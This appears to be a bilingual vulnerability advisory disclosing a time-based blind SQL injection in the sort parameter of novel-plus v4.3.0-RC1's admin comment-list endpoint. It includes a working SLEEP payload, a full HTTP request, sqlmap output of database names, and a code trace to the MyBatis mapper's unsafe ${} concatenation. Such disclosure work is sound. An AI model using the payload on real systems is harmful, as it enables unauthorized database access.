

# SQL injection vulnerability exists in novel-plus v4.3.0-RC1

## The /novel/bookComment/list interface of the novel-admin subsystem in the novel-plus system has SQL injection vulnerability.

#### official website: https://novel.xxyopen.com/index.htm
 
#### github: https://github.com/201206030/novel-plus
 
#### Affected version: v4.3.0-RC1
 
#### releases：https://github.com/201206030/novel-plus/releases/tag/v4.3.0-RC1
 

Payload: 
```
http://127.0.0.1:8088/novel/bookComment/list?limit=10&offset=0&sort=id AND (SELECT 9288 FROM (SELECT(SLEEP(5)))OHwd)&order=desc
```

```
GET /novel/bookComment/list?limit=10&offset=0&sort=id AND (SELECT 9288 FROM (SELECT(SLEEP(5)))OHwd)&order=desc HTTP/1.1
Host: 127.0.0.1:8088
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/json
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: JSESSIONID=e67b0eef-808f-47a6-adc6-47c2be63edb6
Connection: close


```

Use sqlmap for verification, and retrieve all the database names.

使用sqlmap验证，跑出所有库名：

> information_schema<br>
> novel_plus

![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/64a17292-94cb-493e-8bb2-e77895ed6aee)

BookCommentController calls the list method of BookCommentServiceImpl.

BookCommentController调用了BookCommentServiceImpl的list方法；

novel-admin/src/main/java/com/java2nb/novel/controller/BookCommentController.java
![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/f9e34958-d8b0-494b-bd2a-3d606ca34af7)

BookCommentServiceImpl calls the list method of BookCommentMapper.

BookCommentServiceImpl调用了BookCommentMapper的list方法；

novel-admin/src/main/java/com/java2nb/novel/service/impl/BookCommentServiceImpl.java
![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/ac6e5abd-3a24-4bd5-959d-7e170ce86ddf)


In BookCommentMapper, the usage of the $ symbol to concatenate the sort parameter and the order parameter results in an SQL injection vulnerability.

BookCommentMapper中sort参数和order参数使用了$符号来拼接，导致存在SQL注入漏洞；

novel-admin/src/main/resources/mybatis/novel/BookCommentMapper.xml
![image](https://github.com/red0-ha1yu/warehouse/assets/156632069/a16fd9af-1316-429c-8638-4621896f33d2)

